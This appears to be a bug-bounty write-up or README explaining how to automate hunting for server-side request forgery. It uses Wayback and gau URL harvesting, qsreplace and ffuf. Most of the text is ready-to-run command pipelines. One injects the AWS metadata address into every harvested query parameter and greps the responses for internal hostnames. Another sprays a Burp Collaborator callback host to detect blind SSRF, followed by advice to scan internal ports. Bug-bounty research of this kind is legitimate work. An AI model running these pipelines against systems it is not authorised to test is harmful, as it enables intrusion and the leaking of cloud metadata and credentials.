# automation-bugBounty


Hi, everyone
My name is Manoj Kumar . In this article, I will be describing how I was able to Find ssrf vulnerability by bu automating it and leak private information amazon metadata, ec2 and cloud services.

<h2>TIP For looking for SSRF bug with automation:</h2><br>
<h4>Tools Requried:</h4><br>

gf (tomnomnom) — https://github.com/tomnomnom/gf <br>
qsreplace(tomnomnom) — https://github.com/tomnomnom/qsreplace <br>
ffuf — https://github.com/ffuf/ffuf <br>
gau(Corben) — https://github.com/lc/gau <br>
waybackurls(tomnomnom) — https://github.com/tomnomnom/waybackurls <br>

<b>Case#1 — — Accessing SSRF metadata with automation by just using curl and bash </b>

Here get access to internal metadata by ssrf we will collect all URL from way-back machine and look for access the internal data by ssrf
Suppose the the target is targetme.com
Now here process the process for find the ssrf to access internal metadata
Command for getting the URL:

<p style="color:blue;">waybackurl targetme.com >> blindssrftesturl.txt </p>
<p style="color:blue;"> gau -subs targetme.com >> blindssrftesturl.txt </p>

<p style="color:blue;"> cat blindssrftesturl.txt | sort -u |anew | httpx | qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’ </p>
ohhh….yeah………………………

<b>Case#2 — — Find Blind SSRF with automation by just using curl and bash</b>
Now in order to look for blind ssrf we need to get all the URL for testing the blind ssrf we can get URL from way-back machine.
Suppose the the target is targetme.com
Now here process the process for find the Blind ssrf
Command for getting the URL:

<p style="color:blue;">waybackurl targetme.com >> blindssrftesturl.txt</p>
<p style="color:blue;">gau -subs targetme.com >> blindssrftesturl.txt</p>

After Getting all URLS we will sort all the URL and resolve it remove false positive:
<p style="color:blue;">cat blindssrftesturl.txt | sort -u |anew | httpx |tee -a prefinal_ssrftesturl.txt</p>
Now we will used gf for extracting all URL which have parameter vulnerable for ssrf:
<p style="color:blue;">cat prefinal_ssrftesturl.txt | gf ssrf >> final_ssrftesturl.txt</p>
Finally we will used FFUF and burp collabrator server or you can use pingb.in for automating it:
<p style="color:blue;">cat final_ssrftesturl.txt |qsreplace “Burp collaborator server” >> ssrf_auto-ffuf.txt</p>
<p style="color:blue;">ffuf -c -w ssrf_auto-ffuf.txt -u FUZZ</p>
Then check for any dns pingback hit you burp collaborator server.
IF you get any ping back and go for internal port scanning.
ohhh….yeah………………………….
Takeaway
I’m sure that a lot of security researcher had already see there process but this how I approach for find ssrf , and i have reported many in HackerOne using this process, .I hope this will help to find more ssrf
That’s one of the reasons why I wanted to share my experience. also to highlight other techniques to exploit such vulnerability.



